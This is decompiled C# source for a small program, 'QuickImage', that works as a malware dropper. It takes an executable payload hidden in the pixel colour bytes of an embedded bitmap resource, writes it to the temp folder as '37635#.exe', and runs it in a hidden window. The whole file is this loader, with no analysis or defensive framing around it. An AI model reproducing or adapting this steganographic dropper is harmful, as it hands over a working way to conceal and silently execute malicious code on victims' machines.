using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class QuickImage
{
	public static byte[] DCImage(Bitmap BM)
	{
		List<byte> list = new List<byte>();
		checked
		{
			int num = ((Image)BM).get_Width() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)BM).get_Height() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = BM.GetPixel(i, j);
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
			}
			return list.ToArray();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		string text = Path.GetTempPath() + "\\37635#.exe";
		ResourceManager resourceManager = new ResourceManager("myRes", Assembly.GetExecutingAssembly());
		Bitmap bM = (Bitmap)resourceManager.GetObject("Image1");
		byte[] bytes = DCImage(bM);
		File.WriteAllBytes(text, bytes);
		Process process = new Process();
		process.StartInfo.FileName = text;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
		ProjectData.EndApp();
	}
}
